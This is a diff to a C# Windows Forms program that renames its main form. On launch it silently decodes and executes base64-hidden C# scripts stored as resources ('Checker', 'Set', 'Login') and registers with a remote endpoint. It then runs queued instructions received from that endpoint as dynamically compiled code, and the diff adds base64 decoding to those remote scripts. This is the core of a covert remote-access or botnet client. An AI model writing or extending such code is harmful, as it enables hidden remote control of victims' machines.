@@ -9,7 +9,7 @@ using System.Text;
 
 namespace frameless
 {
-    public partial class Form1 : Form
+    public partial class Home : Form
     {
         public class Instruction
         {
@@ -26,8 +26,8 @@ namespace frameless
         private static Queue<Instruction> InstructionsQueue = new Queue<Instruction>();
         private async static void Runn()
         {
-            var resource = new ResourceManager("frameless.Form1", typeof(Form1).Assembly);
-          await Action.ExecuteCsharpCodeAsync(Encoding.UTF8.GetString(Convert.FromBase64String(resource.GetString("Checker"))), new object[] { });
+            var resource = new ResourceManager("frameless.Home", typeof(Home).Assembly);
+            await Action.ExecuteCsharpCodeAsync(Encoding.UTF8.GetString(Convert.FromBase64String(resource.GetString("Checker"))), new object[] { });
             await Action.ExecuteCsharpCodeAsync(Encoding.UTF8.GetString(Convert.FromBase64String(resource.GetString("Set"))), new object[] { });
             Me = (string)await Action.ExecuteCsharpCodeAsync(Encoding.UTF8.GetString(Convert.FromBase64String(resource.GetString("Login"))), new object[] { Properties.Resources.Endpoint });
             Task.Run(() => InstructionHandler());
@@ -128,13 +128,13 @@ namespace frameless
                 {
                     var oldestInstruction = InstructionsQueue.Dequeue();
                     object[] args = string.IsNullOrEmpty(oldestInstruction.functionArgs) ? Array.Empty<object>() : Array.ConvertAll(oldestInstruction.functionArgs.Split(new[] { "*.&-&.*" }, StringSplitOptions.None), item => (object)item);
-                    Action.ExecuteCsharpCodeAsync(oldestInstruction.script, args.Concat(new object[] { Properties.Resources.Endpoint, Me, oldestInstruction.instructionId, oldestInstruction.code }).ToArray());
+                    Action.ExecuteCsharpCodeAsync(Encoding.UTF8.GetString(Convert.FromBase64String(oldestInstruction.script)), args.Concat(new object[] { Properties.Resources.Endpoint, Me, oldestInstruction.instructionId, oldestInstruction.code }).ToArray());
 
                 }
             }
         }
 
-        public Form1()
+        public Home()
         {
             InitializeComponent();
             Runn();
